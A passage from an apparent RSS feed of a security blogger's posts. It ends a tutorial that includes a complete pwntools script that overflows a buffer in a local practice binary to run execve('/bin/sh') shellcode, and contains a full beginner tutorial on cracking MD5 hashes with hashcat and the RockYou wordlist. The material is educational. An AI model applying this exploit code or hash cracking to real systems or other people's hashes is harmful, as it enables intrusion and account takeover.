exploit\u003c/h4\u003e\u003cp\u003eWe can write the shellcode inside the buffer and then use the \u003cstrong\u003ebuffer overflow\u003c/strong\u003e to overwrite the return address of the function \u003cem\u003euser_input\u003c/em\u003e.\u003c/p\u003e\u003cp\u003eThe goal is to substitute it with the address of the buffer. But first, we have to find out what is this address.\u003c/p\u003e\u003cp\u003eA possible way is to use \u003cstrong\u003egdb\u003c/strong\u003e and look to the stack. The address for the breakpoint can be obtained using the command \u003cem\u003edisass user_input\u003c/em\u003e. A good point could be right after the read.\u003c/p\u003e\u003cp\u003eAfter that, we need only to insert 80 characters and print out the stack.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/677/1*-dgqUUUOxhwSoyVGKodj4A.jpeg\" /\u003e\u003cfigcaption\u003eWe can see the saved ebp and saved eip right after the buffer.\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003eHere the final script\u003c/p\u003e\u003cpre\u003e#!/bin/python3\u003c/pre\u003e\u003cpre\u003efrom pwn import *\u003cbr\u003efrom pwn import p64\u003c/pre\u003e\u003cpre\u003ep = process(\u0026quot;./shellcode\u0026quot;)\u003c/pre\u003e\u003cpre\u003ebuffer_address = 0x7fffffffdf00 # this could change, use gdb\u003c/pre\u003e\u003cpre\u003eshellcode = asm(\u0026quot;\u0026quot;\u0026quot;\u003cbr\u003emov rax, 0x3b\u003cbr\u003emov rdi, 0x%x\u003cbr\u003emov rsi, 0\u003cbr\u003emov rdx, 0\u003cbr\u003esyscall\u003cbr\u003e\u0026quot;\u0026quot;\u0026quot; % (buffer_address), arch=\u0026#39;amd64\u0026#39;)\u003c/pre\u003e\u003cpre\u003epayload  = b\u0026quot;/bin/sh\\0\u0026quot;\u003cbr\u003epayload += shellcode\u003cbr\u003epayload  = payload.ljust(80 + 8, b\u0026quot;\\x90\u0026quot;)\u003cbr\u003epayload += p64(buffer_address + 8)\u003c/pre\u003e\u003cpre\u003ep.recvuntil(b\u0026quot;What\u0026#39;s your name?\\n\u0026quot;)\u003cbr\u003ep.sendline(payload)\u003cbr\u003ep.interactive()\u003c/pre\u003e\u003cp\u003eAs you can see we write a payload of 88 characters: eighty for the dimension of the buffer while the other eight for the saved ebp.\u003c/p\u003e\u003cp\u003eThen we append the \u003cstrong\u003eaddress of the buffer \u003c/strong\u003ethat will overwrite the saved eip. Be careful to add eight to the stack address because at the beginning we placed the string \u003cem\u003e/bin/sh\\0\u003c/em\u003e.\u003c/p\u003e\u003cp\u003eFinally, we can run the program and check if everything works.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/677/1*JfO9iZRyONqEwf_fwhVHvA.jpeg\" /\u003e\u003cfigcaption\u003eThe shellcode works and we have obtained a reverse shell.\u003c/figcaption\u003e\u003c/figure\u003e\u003ch4\u003eSome final thoughts\u003c/h4\u003e\u003cp\u003eIn this example we had more than enough space for our shellcode. Beware that sometimes you could have small space available. Instead to directly call an exec, you could start by calling a \u003cstrong\u003eread\u003c/strong\u003e to write more on the memory.\u003c/p\u003e\u003cp\u003eAfter this basic tutorial, it should be simpler to start using shellcode exploits.\u003c/p\u003e\u003cp\u003eFeel free to write your doubts or suggestions about this article.\u003c/p\u003e\u003cimg src=\"https://medium.com/_/stat?event=post.clientViewed\u0026referrerSource=full_rss\u0026postId=1e9ff274a194\" width=\"1\" height=\"1\" alt=\"\"\u003e"
      },
      {
        "Title": "Basic password cracking with hashcat",
        "Description": "",
        "Link": "https://2h3ph3rd.medium.com/basic-password-cracking-with-hashcat-cac4a5e6fb24?source=rss-5a9085122896------2",
        "PubDate": "Sat, 19 Feb 2022 17:02:43 GMT",
        "Creator": "Francesco Pastore",
        "Category": [
          "cybersecurity",
          "hashcat",
          "security",
          "password-cracking",
          "basics"
        ],
        "Guid": "https://medium.com/p/cac4a5e6fb24",
        "Content": "\u003cp\u003eAs a developer, it could be very useful to know how can you test the security of your password hashes. How a hacker could break your hashes? In how much time he could get all the passwords in plain text?\u003c/p\u003e\u003cp\u003eThere are a lot of different ways to do it, in this article we will use the hashcat command utility.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*IvMjMciWV2_iRfs_dpVGIg.jpeg\" /\u003e\u003c/figure\u003e\u003ch3\u003eWait, what type of hash is it?\u003c/h3\u003e\u003cp\u003eI can be sure that you know what type of hash your application uses, but how can a hacker identify it fastly?\u003c/p\u003e\u003cp\u003eThere are very simple tools to use, like a pip package called hashid.\u003c/p\u003e\u003cpre\u003e# you need python3 already installed\u003cbr\u003epip install hashid\u003cbr\u003ehashid \u0026lt;hash\u0026gt;\u003c/pre\u003e\u003cp\u003eOnce installed, it can identify what type of hash could be based on multiple factors like the string length or the characters used.\u003c/p\u003e\u003cp\u003eBelow we can see different hashes of the same string “password”:\u003c/p\u003e\u003cpre\u003e# MD5\u003cbr\u003e5f4dcc3b5aa765d61d8327deb882cf99\u003c/pre\u003e\u003cpre\u003e# LM\u003cbr\u003eE52CAC67419A9A224A3B108F3FA6CB6D\u003c/pre\u003e\u003cpre\u003e# SHA1\u003cbr\u003e5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8\u003c/pre\u003e\u003cpre\u003e# SHA2\u003cbr\u003e5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\u003c/pre\u003e\u003cp\u003eThese are the results for the hashid analysis of the first hash:\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/886/1*GK5WblmRo73xXk8_6bYeLA.png\" /\u003e\u003cfigcaption\u003eYou can see MD5 in the top results\u003c/figcaption\u003e\u003c/figure\u003e\u003ch3\u003eNow I know the hash algorithm, so what?\u003c/h3\u003e\u003cp\u003eNow that we know the hash algorithm it is easier for us to do brute force cracking by generating all possible password combinations.\u003c/p\u003e\u003cp\u003eWait, testing all possible passwords could require a very long time. If you check only the 26 minuscule letters, a password with 10 characters means 26¹⁰ = 1,411670957×10¹⁴ possible combinations!\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*U_g4gbeKf0yqJNQJawH63Q.jpeg\" /\u003e\u003cfigcaption\u003eIn each position, we can have 26 possible characters (considering only the minuscule Latin letters)\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003eFortunately, most people use passwords simple to remember like birthday or anniversary dates, relatives’ names, or film/videogames/tv characters like “pikachu” or “brucelee”.\u003c/p\u003e\u003cp\u003eHashcat can work with regex and pattern generation to start the cracking only with the most common password.\u003c/p\u003e\u003ch3\u003ePassword lists\u003c/h3\u003e\u003cp\u003eOne of the most commonly used password lists is the RockYou list.\u003c/p\u003e\u003cp\u003eYou can find it easily on the internet or already downloaded on the most common security distro like Kali or Parrot.\u003c/p\u003e\u003cp\u003eEven using this list could require a long time, mainly when also the hashing algorithm is complex and with a slower execution.\u003c/p\u003e\u003cp\u003eFor this reason, exists smaller collections of RockYou with only the most common password based on popularity.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/858/1*6G5rjuXXAn8ROuMuRAVvaw.png\" /\u003e\u003cfigcaption\u003eRockyou list on Kali Linux\u003c/figcaption\u003e\u003c/figure\u003e\u003ch3\u003eSome cracking attempts\u003c/h3\u003e\u003cp\u003eNow we have the hash and a password list, also we know the type of hash and which tool to use. We can start the cracking!\u003c/p\u003e\u003cp\u003eWe need to specify the hashcat mode that corresponds to the hash algorithm to use.\u003c/p\u003e\u003cp\u003eWe can easily find it by searching in the help output with a grep command followed by the hash name.\u003c/p\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/885/1*U7T1YdYSMilvdFvfWreGYw.png\" /\u003e\u003cfigcaption\u003eSearching for MD5 mode\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003eAfter specifying the mode, we only need to write the hash and a wordlist, then hashcat will do its work. That’s it!\u003c/p\u003e\u003cpre\u003e# on kali linux /usr/share/wordlists/rockyou.txt\u003cbr\u003ehashcat -m 0 bdc87b9c894da5168059e00ebffb9077 path/to/wordlists/rockyou.txt\u003c/pre\u003e\u003cfigure\u003e\u003cimg alt=\"\" src=\"https://cdn-images-1.medium.com/max/548/1*u3vrZKEYKkeft0BJNpro8Q.png\" /\u003e\u003cfigcaption\u003eHashcat result for the first hash, mode md5, and password list rockyou.txt\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003eI hope that this brief tutorial helps you to understand the basics of password cracking. Don’t hesitate to write in comments your thoughts or doubts!\u003c/p\u003e\u003cimg src=\"https://medium.com/_/stat?event=post.clientViewed\u0026referrerSource=full_rss\u0026postId=cac4a5e6fb24\" width=\"1\" height=\"1\" alt=\"\"\u003e"
      }
    ]
  }
}